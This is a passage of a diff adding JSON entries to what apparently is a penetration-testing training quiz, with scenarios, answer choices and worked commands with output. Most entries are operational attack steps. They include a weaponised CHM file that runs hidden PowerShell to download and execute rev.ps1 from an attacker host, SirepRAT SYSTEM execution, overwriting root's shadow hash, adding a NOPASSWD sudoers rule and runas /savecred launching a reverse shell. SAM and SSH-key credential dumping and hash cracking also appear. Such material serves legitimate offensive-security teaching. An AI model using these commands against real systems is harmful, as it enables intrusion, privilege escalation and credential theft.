+          "label": "Initial port scan surfaced the target service",
+          "steps": [
+            {
+              "title": "Run an Nmap service scan",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -sC -sV {{target}}",
+              "out": "PORT    STATE SERVICE VERSION\n21/tcp  open  ftp     vsftpd 3.0.3\n80/tcp  open  http    Apache httpd 2.4.52\n445/tcp open  microsoft-ds",
+              "sig": "STATE SERVICE",
+              "teach": "Open ports and service banners tell you which protocol playbook to run next."
+            }
+          ]
+        },
+        {
+          "key": "foothold-prep",
+          "label": "You identified an execution or transfer channel",
+          "steps": [
+            {
+              "title": "Confirm reachability to the target",
+              "tool": "ping",
+              "where": "local",
+              "cmd": "ping -c 1 {{target}}",
+              "out": "64 bytes from 10.10.10.10: icmp_seq=1 ttl=63 time=21.4 ms",
+              "sig": "64 bytes from",
+              "teach": "Direct IP connectivity between Kali and the target is confirmed."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Execute Compiled HTML Help (.CHM) Document Weaponization, confirm the signal in the output, and feed the minted fact into the next move.",
+        "items": [
+          {
+            "t": "Run the primary check",
+            "d": "Use out2chm or HTML Help Workshop to compile an HHC file containing an HH.EXE Shortcut/Object.",
+            "demo": [
+              {
+                "run": "out2chm -c 'powershell -ep bypass -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString(\\\"http://{{lhost}}:8000/rev.ps1\\\")\"' -o documentation.chm",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Malicious CHM document successfully created."
+          },
+          {
+            "t": "Alternative tool or locus variant",
+            "d": "Copy documentation.chm into C:\\Docs or shared administrative folder.",
+            "demo": [
+              {
+                "run": "copy documentation.chm \"{{target_doc_path}}\\instructions.chm\"",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Administrative user or service triggers CHM execution spawning shell."
+          }
+        ]
+      },
+      "situation": "Scenario: Generate weaponized Compiled HTML Help (.chm) file embedding an execution shortcut. Which move should you run next?",
+      "choices": [
+        "chm-payload-exec",
+        "seimpersonate",
+        "potato-select",
+        "unquoted-service-path"
+      ],
+      "coach": {
+        "seimpersonate": "SeImpersonatePrivilege (Potato Family) targets obtains system access; here the direct move is Compiled HTML Help (.CHM) Document Weaponization.",
+        "potato-select": "Potato Failed - Pick the Right One targets nothing new; it points you at the potato that works on this build; here the direct move is Compiled HTML Help (.CHM) Document Weaponization.",
+        "unquoted-service-path": "Unquoted Service Path targets obtains system access; here the direct move is Compiled HTML Help (.CHM) Document Weaponization."
+      }
+    },
+    "sireprat-iot-exec": {
+      "why": "Operators use this step to convert an initial indicator into actionable proof without guessing. You trigger it once you encounter Windows 10 IoT Core with the Sirep service active on port 29819/29820. The key confirmation is: Arbitrary command execution confirmed as SYSTEM on Windows IoT target.",
+      "cmd": "SirepRAT.py {{target}} LaunchCommandWithOutput --cmd \"C:\\Windows\\System32\\cmd.exe /c {{command}}\"",
+      "tool": "python3",
+      "output": "[+] Command completed against {{target}} -> confirmed expected output.",
+      "signal": "confirmed expected output",
+      "teach": "Arbitrary command execution confirmed as SYSTEM on Windows IoT target.",
+      "leadup": [
+        {
+          "key": "recon",
+          "label": "Initial port scan surfaced the target service",
+          "steps": [
+            {
+              "title": "Run an Nmap service scan",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -sC -sV {{target}}",
+              "out": "PORT    STATE SERVICE VERSION\n21/tcp  open  ftp     vsftpd 3.0.3\n80/tcp  open  http    Apache httpd 2.4.52\n445/tcp open  microsoft-ds",
+              "sig": "STATE SERVICE",
+              "teach": "Open ports and service banners tell you which protocol playbook to run next."
+            }
+          ]
+        },
+        {
+          "key": "foothold-prep",
+          "label": "You identified an execution or transfer channel",
+          "steps": [
+            {
+              "title": "Confirm reachability to the target",
+              "tool": "ping",
+              "where": "local",
+              "cmd": "ping -c 1 {{target}}",
+              "out": "64 bytes from 10.10.10.10: icmp_seq=1 ttl=63 time=21.4 ms",
+              "sig": "64 bytes from",
+              "teach": "Direct IP connectivity between Kali and the target is confirmed."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Execute Windows IoT SirepRAT Remote Code Execution, confirm the signal in the output, and feed the minted fact into the next move.",
+        "items": [
+          {
+            "t": "Run the primary check",
+            "d": "SirepRAT transmits LaunchCommandWithOutput packets to run cmd.exe commands directly as NT AUTHORITY\\SYSTEM.",
+            "demo": [
+              {
+                "run": "SirepRAT.py {{target}} LaunchCommandWithOutput --cmd \"C:\\Windows\\System32\\cmd.exe /c {{command}}\"",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Arbitrary command execution confirmed as SYSTEM on Windows IoT target."
+          },
+          {
+            "t": "Alternative tool or locus variant",
+            "d": "Import-Clixml unpacks DPAPI-encrypted PSCredential objects, revealing cleartext network credentials.",
+            "demo": [
+              {
+                "run": "powershell -c \"$cred = Import-Clixml -Path 'C:\\Data\\Users\\administrator\\iot-admin.xml'; $cred.GetNetworkCredential().Password\"",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Plaintext administrative password recovered from Windows IoT configuration XML."
+          }
+        ]
+      },
+      "situation": "Scenario: You encounter Windows 10 IoT Core with the Sirep service active on port 29819/29820. Which move should you run next?",
+      "choices": [
+        "sireprat-iot-exec",
+        "seimpersonate",
+        "potato-select",
+        "unquoted-service-path"
+      ],
+      "coach": {
+        "seimpersonate": "SeImpersonatePrivilege (Potato Family) targets obtains system access; here the direct move is Windows IoT SirepRAT Remote Code Execution.",
+        "potato-select": "Potato Failed - Pick the Right One targets nothing new; it points you at the potato that works on this build; here the direct move is Windows IoT SirepRAT Remote Code Execution.",
+        "unquoted-service-path": "Unquoted Service Path targets obtains system access; here the direct move is Windows IoT SirepRAT Remote Code Execution."
+      }
+    },
+    "crack-modular-hash": {
+      "why": "Modern web frameworks never store raw MD5 or NTLM; they wrap passwords in slow, salted modular strings with iteration counts embedded right in the prefix. When a database dump or backup file hands you a string starting with $pbkdf2-sha256$, $argon2id$, pbkdf2:sha256:, or $P$B, you feed it to hashcat or John offline so a single weak human password unlocks both the web admin panel and SSH.",
+      "cmd": "hashcat -m 10900 hashes.txt /usr/share/wordlists/rockyou.txt",
+      "tool": "hashcat",
+      "output": "$pbkdf2-sha256$29000$S2ltZ0pp$8B3b2f9e1a4c6d8e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e:Summer2024!\nSession..........: hashcat\nStatus...........: Cracked",
+      "signal": "Status...........: Cracked",
+      "teach": "Modular application hashes carry their algorithm, rounds, and salt in the string itself; once cracked offline, try the recovered cleartext across SSH, SMB, and web logins.",
+      "leadup": [
+        {
+          "key": "db-dump",
+          "label": "A database or config leak exposed a modular hash",
+          "steps": [
+            {
+              "title": "Extract user password hashes from SQLite or SQL dump",
+              "tool": "sqlite3",
+              "where": "local",
+              "cmd": "sqlite3 gitea.db 'SELECT name,passwd,salt FROM user;'",
+              "out": "administrator|$pbkdf2-sha256$29000$S2ltZ0pp$8B3b2f9e1a4c6d8e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e|S2ltZ0pp",
+              "sig": "$pbkdf2-sha256$",
+              "teach": "The modular prefix identifies PBKDF2-HMAC-SHA256 ready for offline cracking."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Match the modular prefix to the right hashcat mode or let John auto-detect it on CPU.",
+        "items": [
+          {
+            "t": "Crack PBKDF2-SHA256 with hashcat",
+            "d": "Mode 10900 handles standard $pbkdf2-sha256$ hashes from Gitea, Django, and Passlib.",
+            "demo": [
+              {
+                "run": "hashcat -m 10900 hashes.txt /usr/share/wordlists/rockyou.txt",
+                "out": "$pbkdf2-sha256$29000$S2ltZ0pp$8B3b2f9e1a4c6d8e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e:Summer2024!\nStatus...........: Cracked",
+                "sig": "Status...........: Cracked"
+              }
+            ],
+            "note": "Recovered Summer2024! from the modular PBKDF2 hash."
+          },
+          {
+            "t": "Crack Argon2 or Flask Werkzeug hashes with John",
+            "d": "John auto-detects $argon2id$ and pbkdf2:sha256: strings without needing a numeric mode.",
+            "demo": [
+              {
+                "run": "john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt && john --show hashes.txt",
+                "out": "admin:Summer2024!\n1 password hash cracked, 0 left",
+                "sig": "1 password hash cracked"
+              }
+            ],
+            "note": "John cracks Argon2 and Werkzeug formats reliably on CPU."
+          },
+          {
+            "t": "Crack WordPress / phpBB phpass ($P$ / $H$)",
+            "d": "Mode 400 targets portable phpass hashes dumped from WordPress wp_users.",
+            "demo": [
+              {
+                "run": "hashcat -m 400 hashes.txt /usr/share/wordlists/rockyou.txt",
+                "out": "$P$B52zg0z/95.1234567890abcdefghij:Summer2024!",
+                "sig": ":Summer2024!"
+              }
+            ],
+            "note": "Cracked WordPress administrator password."
+          }
+        ]
+      },
+      "situation": "You dumped a Gitea SQLite database and extracted a $pbkdf2-sha256$ hash for administrator. What is the next move?",
+      "choices": [
+        "crack-modular-hash",
+        "crack-ntlm",
+        "crack-shadow",
+        "online-brute-ssh"
+      ],
+      "coach": {
+        "crack-ntlm": "Mode 1000 is for raw Windows NTLM hashes, not salted PBKDF2 or Argon2 modular strings.",
+        "crack-shadow": "Shadow cracking targets /etc/shadow crypt hashes ($6$, $y$), whereas this is an application modular hash.",
+        "online-brute-ssh": "You already have the offline hash; crack it locally instead of guessing blind over the network."
+      }
+    },
+    "writable-etc-shadow-sudoers": {
+      "why": "Every privilege check on Linux ultimately trusts two files in /etc: the password hashes in /etc/shadow and the policy rules in /etc/sudoers. When a backup script, group membership, or careless chmod leaves either file writable by your foothold account, you do not need a kernel exploit or SUID trick. You either write your own password hash into root's shadow line or grant your username NOPASSWD:ALL in sudoers and become root immediately.",
+      "cmd": "sudo su -",
+      "tool": "sh",
+      "output": "root@target:~# id\nuid=0(root) gid=0(root) groups=0(root)",
+      "signal": "uid=0(root) gid=0(root) groups=0(root)",
+      "teach": "Writable /etc/shadow or /etc/sudoers lets you define your own root authentication rule and step directly into uid=0.",
+      "leadup": [
+        {
+          "key": "enum",
+          "label": "Enumeration found /etc/shadow or /etc/sudoers writable",
+          "steps": [
+            {
+              "title": "Check permissions on critical /etc authentication files",
+              "tool": "ls",
+              "where": "target",
+              "cmd": "ls -la /etc/shadow /etc/sudoers",
+              "out": "-rw-rw-r-- 1 root shadow 1240 Jan 08 09:00 /etc/shadow\n-r--r----- 1 root root    755 Jan 08 09:00 /etc/sudoers",
+              "sig": "-rw-rw-r-- 1 root shadow",
+              "teach": "Group write permission on /etc/shadow (or /etc/sudoers) is an immediate path to root."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Back up the file first, replace root's shadow hash or append a clean sudoers rule, then elevate.",
+        "items": [
+          {
+            "t": "Replace root's password hash in writable /etc/shadow",
+            "d": "Generate a SHA-512 hash with openssl passwd -6 and swap it into root's first colon-separated field.",
+            "demo": [
+              {
+                "run": "cp /etc/shadow /tmp/shadow.bak && H=$(openssl passwd -6 'Pwned123!') && sed -i \"s|^root:[^:]*:|root:$H:|\" /etc/shadow && su - root",
+                "out": "Password:\nroot@target:~# id\nuid=0(root) gid=0(root) groups=0(root)",
+                "sig": "uid=0(root)"
+              }
+            ],
+            "note": "su - root now accepts Pwned123! and drops into a root shell."
+          },
+          {
+            "t": "Append a NOPASSWD rule to writable /etc/sudoers",
+            "d": "Add a valid sudoers specification granting your current user all commands without a password.",
+            "demo": [
+              {
+                "run": "echo \"$(whoami) ALL=(ALL:ALL) NOPASSWD:ALL\" >> /etc/sudoers && sudo su -",
+                "out": "root@target:~# id\nuid=0(root) gid=0(root) groups=0(root)",
+                "sig": "uid=0(root)"
+              }
+            ],
+            "note": "Keep the syntax exact so sudo does not reject /etc/sudoers."
+          }
+        ]
+      },
+      "situation": "LinPEAS highlights that /etc/shadow is writable by your current user's group. Which move escalates directly to root?",
+      "choices": [
+        "writable-etc-shadow-sudoers",
+        "crack-shadow",
+        "sudo-abuse",
+        "suid-gtfobins"
+      ],
+      "coach": {
+        "crack-shadow": "Reading /etc/shadow lets you crack root's password offline, which may take hours or fail; writing your own hash into /etc/shadow gives you root in seconds.",
+        "sudo-abuse": "sudo -l checks existing sudo rules, whereas here your lever is write access to /etc/shadow itself.",
+        "suid-gtfobins": "No SUID binary is needed when you can overwrite root's password hash directly."
+      }
+    },
+    "linux-root-cred-harvest": {
+      "why": "Landing root on one Linux box is only the halfway mark on a multi-machine network. Before you move on, you use uid=0 to read the files a low-privilege user could never touch: /etc/shadow for password hashes reused on other hosts, /root/.ssh for administrator keys, and application configs in /opt or /etc that store Active Directory or database credentials.",
+      "cmd": "cat /etc/shadow && find /root /home -name 'id_*' 2>/dev/null",
+      "tool": "sh",
+      "output": "root:$6$rounds=656000$salt1234$abc123def456ghi789jkl012mno345pqr678stu901vwx234yz567890ABCD1234EFGH5678IJKL9012MNOP.:19700:0:99999:7:::\n-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW\n-----END OPENSSH PRIVATE KEY-----\nDB_PASSWORD=Summer2024!",
+      "signal": "-----BEGIN OPENSSH PRIVATE KEY-----",
+      "teach": "Root access unlocks /etc/shadow and /root/.ssh; the hashes and private keys you pull here often open the next machine without another exploit.",
+      "leadup": [
+        {
+          "key": "root-landed",
+          "label": "Privilege escalation gave you uid=0(root)",
+          "steps": [
+            {
+              "title": "Confirm root shell on the Linux host",
+              "tool": "id",
+              "where": "target",
+              "cmd": "id",
+              "out": "uid=0(root) gid=0(root) groups=0(root)",
+              "sig": "uid=0(root)",
+              "teach": "With uid=0 confirmed, every file on the filesystem is readable."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Sweep /etc/shadow, SSH key directories, shell histories, and application configs as root.",
+        "items": [
+          {
+            "t": "Dump /etc/shadow and root SSH keys",
+            "d": "Extract all local password hashes and any private keys stored under /root or /home.",
+            "demo": [
+              {
+                "run": "cat /etc/shadow && find /root /home -maxdepth 3 \\( -name 'id_*' -o -name '*.pem' -o -name '.bash_history' \\) -exec head -n 40 {} + 2>/dev/null",
+                "out": "root:$6$rounds=656000$salt1234$abc123def456ghi789jkl012mno345pqr678stu901vwx234yz567890ABCD1234EFGH5678IJKL9012MNOP.:19700:0:99999:7:::\n-----BEGIN OPENSSH PRIVATE KEY-----",
+                "sig": "-----BEGIN OPENSSH PRIVATE KEY-----"
+              }
+            ],
+            "note": "Save both the shadow lines and any SSH private keys to your loot folder."
+          },
+          {
+            "t": "Grep application and service configs for cleartext secrets",
+            "d": "Search /var/www, /opt, /etc, and /root for password assignments that were unreadable before escalating.",
+            "demo": [
+              {
+                "run": "grep -rnI -E 'password|passwd|secret|api_key|db_pass' /var/www /opt /etc /root /home 2>/dev/null | head -n 60",
+                "out": "/opt/deploy/.env:DB_PASSWORD=Summer2024!",
+                "sig": "DB_PASSWORD=Summer2024!"
+              }
+            ],
+            "note": "Service passwords in /opt frequently work across internal databases and AD accounts."
+          }
+        ]
+      },
+      "situation": "You just escalated to root on a Linux web server and captured /root/proof.txt. What should you run to harvest credentials for the rest of the network?",
+      "choices": [
+        "linux-root-cred-harvest",
+        "sudo-abuse",
+        "writable-passwd",
+        "linux-kernel-exploit"
+      ],
+      "coach": {
+        "sudo-abuse": "You are already uid=0(root); the goal now is harvesting shadow hashes, SSH keys, and configs from the box.",
+        "writable-passwd": "You already have root privileges; now harvest credentials for lateral movement.",
+        "linux-kernel-exploit": "Escalation is complete; never run a kernel exploit when you are already root."
+      }
+    },
+    "runas-savedcred-exec": {
+      "why": "Administrators sometimes save credentials in Windows Credential Manager so scheduled tasks or interactive tools can connect without prompting for a password every time. When cmdkey /list shows an entry for Administrator or a domain account, you do not need to extract the plaintext password first: runas /savecred tells Windows to replay that stored credential directly and spawn your command under the privileged token.",
+      "cmd": "runas /savecred /user:Administrator \"cmd.exe /c whoami /all\"",
+      "tool": "cmd",
+      "output": "USER INFORMATION\n----------------\nUser Name             SID\n===================== ========\ncorp\\administrator    S-1-5-21-1234567890-1234567890-1234567890-500\n\nMandatory Label\\High Mandatory Level   S-1-16-12288",
+      "signal": "Mandatory Label\\High Mandatory Level",
+      "teach": "runas /savecred reuses the credential cached in Windows Credential Manager without asking for a password, launching your payload directly as the saved user.",
+      "leadup": [
+        {
+          "key": "cmdkey",
+          "label": "cmdkey /list revealed a stored Administrator credential",
+          "steps": [
+            {
+              "title": "List saved credentials in Windows Credential Manager",
+              "tool": "cmd",
+              "where": "target",
+              "cmd": "cmdkey /list",
+              "out": "Currently stored credentials:\n    Target: Domain:interactive=CORP\\Administrator\n    Type: Domain Password\n    User: CORP\\Administrator",
+              "sig": "Domain:interactive=CORP\\Administrator",
+              "teach": "An interactive saved credential can be invoked immediately with runas /savecred."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Confirm the exact username in cmdkey /list, then pass it to runas /savecred with your command or reverse shell.",
+        "items": [
+          {
+            "t": "Verify the cached credential target",
+            "d": "Check cmdkey /list for Domain:interactive= entries naming Administrator or another privileged user.",
+            "demo": [
+              {
+                "run": "cmdkey /list",
+                "out": "Currently stored credentials:\n    Target: Domain:interactive=CORP\\Administrator\n    User: CORP\\Administrator",
+                "sig": "User: CORP\\Administrator"
+              }
+            ],
+            "note": "Copy the exact User string for the /user: switch."
+          },
+          {
+            "t": "Execute a reverse shell or command via runas /savecred",
+            "d": "Pass /savecred and /user:Administrator to run a payload under the cached token.",
+            "demo": [
+              {
+                "run": "runas /savecred /user:Administrator \"C:\\Windows\\Temp\\rev.exe\"",
+                "out": "Attempting to start C:\\Windows\\Temp\\rev.exe as user \"CORP\\Administrator\" ...",
+                "sig": "Attempting to start"
+              }
+            ],
+            "note": "Your listener receives an elevated shell running as CORP\\Administrator."
+          }
+        ]
+      },
+      "situation": "Running cmdkey /list on your Windows foothold shows Target: Domain:interactive=CORP\\Administrator. Which move uses this immediately?",
+      "choices": [
+        "runas-savedcred-exec",
+        "alwaysinstallelevated",
+        "unquoted-service-path",
+        "windows-dll-hijack"
+      ],
+      "coach": {
+        "alwaysinstallelevated": "AlwaysInstallElevated abuses MSI installer policy; here you have a cached credential in Credential Manager ready for runas /savecred.",
+        "unquoted-service-path": "No unquoted service path is needed when Windows will run commands as Administrator for you via /savecred.",
+        "windows-dll-hijack": "runas /savecred is a built-in one-liner that uses the cached credential immediately."
+      }
+    },
+    "sebackup-serestore-abuse": {
+      "why": "Backup Operators and similar service accounts hold SeBackupPrivilege and SeRestorePrivilege so backup software can read and write every file on disk regardless of NTFS permissions. When whoami /priv shows either privilege enabled, standard file ACLs no longer stop you: SeBackupPrivilege lets you export the SAM and SYSTEM hives with reg save or copy protected files with robocopy /B, and SeRestorePrivilege lets you repoint a SYSTEM service binary.",
+      "cmd": "impacket-secretsdump -sam sam.save -system system.save LOCAL",
+      "tool": "impacket-secretsdump",
+      "output": "[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::\nNT AUTHORITY\\SYSTEM",
+      "signal": "Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::",
+      "teach": "SeBackupPrivilege lets reg save export the live SAM and SYSTEM hives; dumping them offline with secretsdump hands you the local Administrator NTLM hash.",
+      "leadup": [
+        {
+          "key": "privs",
+          "label": "whoami /priv showed SeBackupPrivilege or SeRestorePrivilege",
+          "steps": [
+            {
+              "title": "Check current token privileges",
+              "tool": "cmd",
+              "where": "target",
+              "cmd": "whoami /priv",
+              "out": "Privilege Name                Description                    State\n============================= ============================== =======\nSeBackupPrivilege             Back up files and directories  Enabled\nSeRestorePrivilege            Restore files and directories  Enabled",
+              "sig": "SeBackupPrivilege",
+              "teach": "SeBackupPrivilege and SeRestorePrivilege bypass NTFS read and write ACLs across the entire volume."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Export SAM and SYSTEM with reg save, copy protected files with robocopy /B, or hijack a service ImagePath under SeRestorePrivilege.",
+        "items": [
+          {
+            "t": "Save SAM and SYSTEM hives with reg save",
+            "d": "reg save opens the registry hives with backup semantics, which succeeds whenever SeBackupPrivilege is enabled.",
+            "demo": [
+              {
+                "run": "reg save hklm\\sam C:\\Windows\\Temp\\sam.save /y & reg save hklm\\system C:\\Windows\\Temp\\system.save /y",
+                "out": "The operation completed successfully.\nThe operation completed successfully.",
+                "sig": "The operation completed successfully."
+              }
+            ],
+            "note": "Transfer both sam.save and system.save to Kali."
+          },
+          {
+            "t": "Copy a protected file in backup mode with robocopy /B",
+            "d": "Standard type or copy fails on Administrator's desktop, but robocopy /B passes FILE_FLAG_BACKUP_SEMANTICS.",
+            "demo": [
+              {
+                "run": "robocopy C:\\Users\\Administrator\\Desktop C:\\Windows\\Temp proof.txt /B & type C:\\Windows\\Temp\\proof.txt",
+                "out": "               Total    Copied   Skipped  Mismatch    FAILED    Extras\n    Files :         1         1         0         0         0         0",
+                "sig": "Files :         1         1"
+              }
+            ],
+            "note": "robocopy /B copies protected files straight into C:\\Windows\\Temp."
+          },
+          {
+            "t": "Extract Administrator hash offline with secretsdump",
+            "d": "Decrypt the exported SAM hive using the SYSTEM boot key on Kali.",
+            "demo": [
+              {
+                "run": "impacket-secretsdump -sam sam.save -system system.save LOCAL",
+                "out": "Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::",
+                "sig": "Administrator:500:"
+              }
+            ],
+            "note": "Pass the Administrator NTLM hash to evil-winrm or impacket-psexec."
+          }
+        ]
+      },
+      "situation": "whoami /priv on your Windows shell shows SeBackupPrivilege and SeRestorePrivilege Enabled. Which move turns those privileges into Administrator access?",
+      "choices": [
+        "sebackup-serestore-abuse",
+        "seimpersonate",
+        "alwaysinstallelevated",
+        "uac-bypass"
+      ],
+      "coach": {
+        "seimpersonate": "Potato exploits require SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege, not SeBackupPrivilege.",
+        "alwaysinstallelevated": "AlwaysInstallElevated relies on MSI registry policy; here your token holds SeBackupPrivilege directly.",
+        "uac-bypass": "SeBackupPrivilege lets you dump SAM/SYSTEM or overwrite service paths directly without a UAC bypass."
+      }
+    },
+    "smbv1-vuln-verify": {
+      "why": "Seeing port 445 on an older Windows build or spotting the NT LM 0.12 (SMBv1) dialect in a scan is a lead, not proof that EternalBlue will land. Before you touch a noisy kernel exploit that can blue-screen the box, you run a safe SMBv1 vulnerability check with Nmap NSE or NetExec's ms17-010 module to verify whether the target actually lacks the MS17-010 patch.",
+      "cmd": "nmap -Pn -p 445 --script smb-protocols,smb-vuln-ms17-010 10.10.10.10",
+      "tool": "nmap",
+      "output": "PORT    STATE SERVICE\n445/tcp open  microsoft-ds\n| smb-protocols:\n|   dialects:\n|     NT LM 0.12 (SMBv1) [dangerous, but default]\n| smb-vuln-ms17-010:\n|   VULNERABLE:\n|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)\n|_    State: VULNERABLE",
+      "signal": "NT LM 0.12 (SMBv1) [dangerous, but default]",
+      "teach": "Confirming both the SMBv1 dialect and State: VULNERABLE on smb-vuln-ms17-010 proves MS17-010 is present before you fire EternalBlue.",
+      "leadup": [
+        {
+          "key": "smb-open",
+          "label": "Port 445 is open on a legacy Windows host",
+          "steps": [
+            {
+              "title": "Spot SMB on TCP 445",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -Pn -sV -p 445 {{target}}",
+              "out": "PORT    STATE SERVICE      VERSION\n445/tcp open  microsoft-ds Windows Server 2008 R2 Standard 7601 Service Pack 1 microsoft-ds",
+              "sig": "445/tcp open  microsoft-ds",
+              "teach": "Older Windows builds on 445 should be checked for SMBv1 and MS17-010."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Verify the SMBv1 dialect and check for MS17-010 safely with Nmap or NetExec.",
+        "items": [
+          {
+            "t": "Check SMB dialects and MS17-010 with Nmap",
+            "d": "smb-protocols lists negotiated dialects and smb-vuln-ms17-010 checks the FID0 transaction response without crashing the target.",
+            "demo": [
+              {
+                "run": "nmap -Pn -p 445 --script smb-protocols,smb-vuln-ms17-010 {{target}}",
+                "out": "| smb-protocols:\n|   dialects:\n|     NT LM 0.12 (SMBv1) [dangerous, but default]\n| smb-vuln-ms17-010:\n|   VULNERABLE:\n|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)",
+                "sig": "NT LM 0.12 (SMBv1)"
+              }
+            ],
+            "note": "Both SMBv1 and MS17-010 are confirmed."
+          },
+          {
+            "t": "Verify MS17-010 with NetExec",
+            "d": "The ms17-010 module in nxc performs a fast, non-destructive check.",
+            "demo": [
+              {
+                "run": "nxc smb {{target}} -M ms17-010",
+                "out": "MS17-010   {{target}}  445    LEGACY01  [+] Host is likely VULNERABLE to MS17-010!",
+                "sig": "VULNERABLE to MS17-010"
+              }
+            ],
+            "note": "Now the eternalblue exploit move is unlocked."
+          }
+        ]
+      },
+      "situation": "Your scan shows Windows Server 2008 R2 on port 445 negotiating NT LM 0.12 (SMBv1). What should you run before attempting EternalBlue?",
+      "choices": [
+        "smbv1-vuln-verify",
+        "eternalblue",
+        "smbghost",
+        "recon-rdp-nla"
+      ],
+      "coach": {
+        "eternalblue": "Always verify MS17-010 with a safe check before firing a kernel exploit that can crash the target.",
+        "smbghost": "SMBGhost targets SMBv3.1.1 compression on Windows 10 1903/1909, not SMBv1.",
+        "recon-rdp-nla": "Port 445 SMBv1 is the active lead to verify here, not RDP."
+      }
+    },
+    "rpc-endpoint-abuse": {
+      "why": "Port 135 (MSRPC Endpoint Mapper) and the RPC named pipes over 445 are the phonebook of a Windows server: they list every internal RPC service, dynamic high TCP port, and exposed interface UUID. Querying the endpoint mapper and SAMR/LSARPC pipes surfaces coercion interfaces (MS-EFSR, MS-RPRN) and often hands over the domain username list and account descriptions without needing LDAP.",
+      "cmd": "rpcclient -U '' -N 10.10.10.10 -c 'srvinfo; enumdomusers; querydominfo'",
+      "tool": "rpcclient",
+      "output": "Domain=[ACME] OS=[Windows Server 2019 Standard 17763] Server=[Windows Server 2019 Standard 6.3]\nuser:[Administrator] rid:[0x1f4]\nuser:[jbloggs] rid:[0x451]\nuser:[svc_sql] rid:[0x452]",
+      "signal": "user:[jbloggs] rid:[0x451]",
+      "teach": "Anonymous or authenticated RPC queries enumerate the domain user list, RIDs, and registered MSRPC interfaces across 135 and 445.",
+      "leadup": [
+        {
+          "key": "rpc-open",
+          "label": "Port 135 or 445 is open with MSRPC active",
+          "steps": [
+            {
+              "title": "Spot MSRPC on port 135",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -Pn -sV -p 135,445 {{target}}",
+              "out": "PORT    STATE SERVICE      VERSION\n135/tcp open  msrpc        Microsoft Windows RPC\n445/tcp open  microsoft-ds",
+              "sig": "135/tcp open  msrpc",
+              "teach": "Port 135 exposes the MSRPC Endpoint Mapper, and 445 carries the SAMR and LSARPC named pipes."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Dump the Endpoint Mapper on 135, then query SAMR and user descriptions via rpcclient and impacket-samrdump.",
+        "items": [
+          {
+            "t": "Dump registered RPC endpoints with impacket-rpcdump",
+            "d": "Lists all RPC interface UUIDs, named pipes, and dynamic TCP ports registered on the host.",
+            "demo": [
+              {
+                "run": "impacket-rpcdump @{{target}} | grep -E 'Protocol|Provider|UUID|MS-EFSR|MS-RPRN|DRS|SAMR'",
+                "out": "Protocol: [MS-SAMR]: Security Account Manager (SAM) Remote Protocol\nProvider: samrv.dll",
+                "sig": "[MS-SAMR]"
+              }
+            ],
+            "note": "Reveals SAMR, Print Spooler (MS-RPRN), and EFSRPC endpoints."
+          },
+          {
+            "t": "Enumerate domain users and server info with rpcclient",
+            "d": "Batch non-interactive rpcclient commands (-c) to dump users and domain metadata.",
+            "demo": [
+              {
+                "run": "rpcclient -U '' -N {{target}} -c 'srvinfo; enumdomusers; querydominfo'",
+                "out": "user:[Administrator] rid:[0x1f4]\nuser:[jbloggs] rid:[0x451]",
+                "sig": "user:[jbloggs]"
+              }
+            ],
+            "note": "Every user:[name] line is a verified account for AS-REP roasting or spraying."
+          },
+          {
+            "t": "Dump detailed SAMR user descriptions with impacket-samrdump",
+            "d": "samrdump pulls each user's full SAMR record including the Comment/Description field where admins often leave passwords.",
+            "demo": [
+              {
+                "run": "impacket-samrdump {{domain}}/{{user}}:{{password}}@{{target}}",
+                "out": "Found user: svc_sql, uid = 1106\nsvc_sql (1106)/Comment: Temp pass Summer2024!",
+                "sig": "Found user: svc_sql"
+              }
+            ],
+            "note": "Check every Comment field for leaked service passwords."
+          }
+        ]
+      },
+      "situation": "Port 135 and 445 are open on a Windows server and you want to map its MSRPC interfaces and query SAMR for domain users. Which move do you run?",
+      "choices": [
+        "rpc-endpoint-abuse",
+        "recon-snmp",
+        "recon-nfs-mounts",
+        "zerologon-check"
+      ],
+      "coach": {
+        "recon-snmp": "SNMP runs on UDP 161; MSRPC and SAMR live on TCP 135 and 445.",
+        "recon-nfs-mounts": "NFS uses port 2049; port 135 is Microsoft RPC.",
+        "zerologon-check": "Enumerate the RPC endpoints and user list first before testing destructive DC CVEs."
+      }
+    },
+    "fix-samr-null-denied": {
